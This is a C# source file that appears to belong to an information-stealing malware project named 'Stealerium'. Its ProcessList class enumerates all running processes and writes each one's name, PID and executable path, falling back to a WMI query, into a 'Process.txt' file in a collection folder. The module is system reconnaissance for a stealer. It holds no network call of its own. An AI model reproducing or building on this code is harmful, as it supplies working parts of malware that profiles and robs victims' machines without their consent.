using System.Diagnostics;
using System.IO;
using System.Management;

namespace Stealerium.Target.System
{
    internal sealed class ProcessList
    {
        // Save the list of processes to a file
        public static void WriteProcesses(string sSavePath)
        {
            string processFilePath = Path.Combine(sSavePath, "Process.txt");

            foreach (var process in Process.GetProcesses())
            {
                var processInfo = $"NAME: {process.ProcessName}" +
                                  $"\n\tPID: {process.Id}" +
                                  $"\n\tEXE: {ProcessExecutablePath(process)}\n\n";

                File.AppendAllText(processFilePath, processInfo);
            }
        }

        // Get the process executable path
        public static string ProcessExecutablePath(Process process)
        {
            try
            {
                // Attempt to get the process executable path from MainModule
                if (process.MainModule != null)
                {
                    return process.MainModule.FileName;
                }
            }
            catch
            {
                // If MainModule access fails, fallback to querying via WMI
                var query = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
                var searcher = new ManagementObjectSearcher(query);

                foreach (var o in searcher.Get())
                {
                    var item = (ManagementObject)o;
                    var processId = item["ProcessID"]?.ToString();
                    var executablePath = item["ExecutablePath"]?.ToString();

                    if (executablePath != null && processId == process.Id.ToString())
                    {
                        return executablePath;
                    }
                }
            }

            // Return an empty string if path cannot be found
            return string.Empty;
        }
    }
}
